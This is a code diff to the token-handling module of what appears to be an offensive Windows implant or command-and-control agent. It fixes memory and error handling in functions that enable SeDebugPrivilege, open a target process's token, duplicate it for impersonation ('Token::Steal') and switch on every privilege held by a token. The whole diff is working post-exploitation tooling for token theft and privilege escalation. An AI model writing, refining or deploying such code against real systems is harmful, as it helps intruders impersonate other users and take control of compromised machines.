@@ -5,8 +5,8 @@ using namespace Root;
 auto DECLFN Token::CurrentPs( VOID ) -> HANDLE {
     HANDLE hToken = nullptr;
     
-    this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken );
-    this->ProcOpen( NtCurrentProcess(), TOKEN_QUERY, &hToken );
+    this->TdOpen( NtCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken );
+    this->ProcOpen( NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken );
 
     return hToken;
 }
@@ -14,7 +14,7 @@ auto DECLFN Token::CurrentPs( VOID ) -> HANDLE {
 auto DECLFN Token::CurrentThread( VOID ) -> HANDLE {
     HANDLE hToken = nullptr;
      
-    this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken );
+    this->TdOpen( NtCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken );
     
     return nullptr;
 }
@@ -213,18 +213,36 @@ auto DECLFN Token::ListPrivs(
     if ( ! TokenPrivs ) return nullptr;
 
     if ( ! Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TokenInfoLen, &TokenInfoLen ) ) {
+        hFree( TokenPrivs );
         return nullptr;
     }
 
     ListCount = TokenPrivs->PrivilegeCount;
-    PrivList  = (PRIV_LIST**)hAlloc( sizeof( PRIV_LIST ) * ListCount );
+    PrivList  = (PRIV_LIST**)hAlloc( sizeof(PRIV_LIST*) * ListCount );
+    if ( ! PrivList ) {
+        hFree( TokenPrivs );
+        return nullptr;
+    }
 
-    for ( INT i = 0; i < ListCount; i++ ) {
+    for ( ULONG i = 0; i < ListCount; i++ ) {
         LUID  luid     = TokenPrivs->Privileges[i].Luid;
         ULONG PrivLen  = MAX_PATH;
         CHAR* PrivName = (CHAR*)hAlloc( PrivLen );
 
-        Self->Advapi32.LookupPrivilegeNameA( nullptr, &luid, PrivName, &PrivLen );
+        if ( ! PrivName ) {
+            continue; 
+        }
+
+        if ( !Self->Advapi32.LookupPrivilegeNameA( nullptr, &luid, PrivName, &PrivLen ) ) {
+            hFree( PrivName );
+            continue;
+        }
+
+        PrivList[i] = (PRIV_LIST*)hAlloc( sizeof( PRIV_LIST ) );
+        if ( ! PrivList[i] ) {
+            hFree( PrivName );
+            continue;
+        }
 
         PrivList[i]->PrivName   = PrivName;
         PrivList[i]->Attributes = TokenPrivs->Privileges[i].Attributes;
@@ -239,13 +257,21 @@ auto DECLFN Token::GetPrivs(
     _In_ HANDLE TokenHandle
 ) -> BOOL {
     ULONG PrivListLen = 0;
-    PVOID PrivList    = nullptr;
+    PVOID RawPrivList = this->ListPrivs( TokenHandle, PrivListLen );
+    if ( !RawPrivList ) return FALSE;
 
-    PrivList = this->ListPrivs( TokenHandle, PrivListLen );
+    PRIV_LIST** PrivList = static_cast<PRIV_LIST**>( RawPrivList );
 
-    for ( INT i = 0; i < PrivListLen; i++ ) {
-        this->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
-        hFree( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
+    for ( ULONG i = 0; i < PrivListLen; i++ ) {
+        if ( ! PrivList[i] ) continue;
+
+        this->SetPriv( TokenHandle, PrivList[i]->PrivName );
+
+        if ( PrivList[i]->PrivName ) {
+            hFree( PrivList[i]->PrivName );
+        }
+
+        hFree( PrivList[i] );
     }
 
     hFree( PrivList );
@@ -259,47 +285,54 @@ auto DECLFN Token::Steal(
     HANDLE      TokenHandle     = INVALID_HANDLE_VALUE;
     HANDLE      TokenDuplicated = INVALID_HANDLE_VALUE;
     HANDLE      ProcessHandle   = INVALID_HANDLE_VALUE;
-    TOKEN_NODE* NewNode         = nullptr;
 
-    if ( TokenHandle = this->CurrentPs() ) {
-        this->SetPriv( TokenHandle, "SeDebugPrivilege" );
-        Self->Ntdll.NtClose( TokenHandle ); TokenHandle = nullptr;
+    HANDLE hCurrentToken = this->CurrentPs();
+    if ( hCurrentToken ) {
+        this->SetPriv( hCurrentToken, "SeDebugPrivilege" );
+        Self->Ntdll.NtClose( hCurrentToken );
     }
 
     ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
-    if ( ! ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
+    if ( !ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
+        KhDbg("[-] Failed to open target process\n");
         goto _KH_END;
     }
 
-    if ( ! this->ProcOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle ) ||
-        TokenHandle == INVALID_HANDLE_VALUE) {
+    if ( !this->ProcOpen( ProcessHandle,
+        TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
+        &TokenHandle ) || TokenHandle == INVALID_HANDLE_VALUE ) {
+        KhDbg("[-] Failed to open token from process\n");
         goto _KH_END;
     }
 
     Self->Ntdll.NtClose( ProcessHandle );
+    ProcessHandle = INVALID_HANDLE_VALUE;
 
-    if ( Self->Advapi32.DuplicateTokenEx( TokenHandle, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenImpersonation, &TokenDuplicated ) ) {
+    if ( Self->Advapi32.DuplicateTokenEx(
+        TokenHandle,
+        MAXIMUM_ALLOWED,
+        nullptr,
+        SecurityImpersonation,
+        TokenImpersonation,
+        &TokenDuplicated ) ) {
+        
         Self->Ntdll.NtClose( TokenHandle );
         return this->Add( TokenDuplicated, ProcessID );
     } else {
+        KhDbg("[!] DuplicateTokenEx failed: using original token (may be limited)\n");
         return this->Add( TokenHandle, ProcessID );
     }
 
 _KH_END:
-    if ( TokenHandle != INVALID_HANDLE_VALUE ) {
+    if ( TokenHandle != INVALID_HANDLE_VALUE )
         Self->Ntdll.NtClose( TokenHandle );
-    }
 
-    if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
+    if ( ProcessHandle != INVALID_HANDLE_VALUE )
         Self->Ntdll.NtClose( ProcessHandle );
-    }
-
-    if ( NewNode ) {
-        hFree( NewNode );
-    }
 
     return nullptr;
 }
+
 
 auto DECLFN Token::SetPriv(
     _In_ HANDLE Handle,
